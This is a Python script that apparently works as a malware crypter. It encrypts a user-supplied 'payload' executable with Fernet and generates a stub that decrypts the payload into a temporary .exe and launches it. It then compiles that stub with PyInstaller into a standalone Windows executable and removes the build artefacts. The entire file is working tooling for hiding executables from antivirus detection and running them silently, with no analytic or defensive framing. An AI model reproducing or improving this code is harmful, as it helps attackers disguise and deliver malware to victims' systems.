import base64
import os
import shutil
import subprocess
import sys
import tempfile
from cryptography.fernet import Fernet


def encrypt_software(input_file):
    key = Fernet.generate_key()
    cipher = Fernet(key)
    with open(input_file, "rb") as f:
        encrypted_data = cipher.encrypt(f.read())

    return key, encrypted_data


def create_decryptor_code(key, encrypted_data):
    decryptor_code = f"""
import os
import base64
import tempfile
from cryptography.fernet import Fernet

key = {key!r}
cipher = Fernet(key)

encrypted_data = {encrypted_data}

# decrypt the content
decrypted_data = cipher.decrypt(encrypted_data)

# create a temporary file and write the decrypted content to it
with tempfile.NamedTemporaryFile(suffix='.exe', delete=False) as tmp_file:
    tmp_file.write(decrypted_data)

# close the file to allow execution
tmp_file.close()

# execute the decrypted file
os.system(f'start {{tmp_file.name}}')
"""

    return decryptor_code


def write_decryptor_script(decryptor_code, output_path, output_filename):
    decryptor_script_path = f"{output_path}\GEN_{output_filename}.pyw"
    with open(decryptor_script_path, "w") as f:
        f.write(decryptor_code)

    return decryptor_script_path


def compile_decryptor_script(decryptor_script_path, input_filename, output_path, output_filename):
    subprocess.call(["pyinstaller", "--onefile", decryptor_script_path])

    os.remove(f'GEN_{input_filename}.spec')
    shutil.rmtree('build')
    shutil.move(f'{output_path}\dist\GEN_{input_filename}.exe',
                f'{output_path}\GEN_{output_filename}.exe')
    shutil.rmtree('dist')
    os.remove(decryptor_script_path)


def main():
    if len(sys.argv) < 2:
        print("Usage: python script.py <path_to_payload>")
        sys.exit(1)

    print("Hello World")
    input_file = sys.argv[1]
    input_filename_w_extention = os.path.basename(input_file)
    input_filename = input_filename_w_extention[:-4]
    output_filename = input_filename
    output_path = os.getcwd()

    key, encrypted_data = encrypt_software(input_file)
    decryptor_code = create_decryptor_code(key, encrypted_data)
    decryptor_script_path = write_decryptor_script(
        decryptor_code, output_path, output_filename)
    compile_decryptor_script(decryptor_script_path,
                            input_filename, output_path, output_filename)


if __name__ == "__main__":
    main()
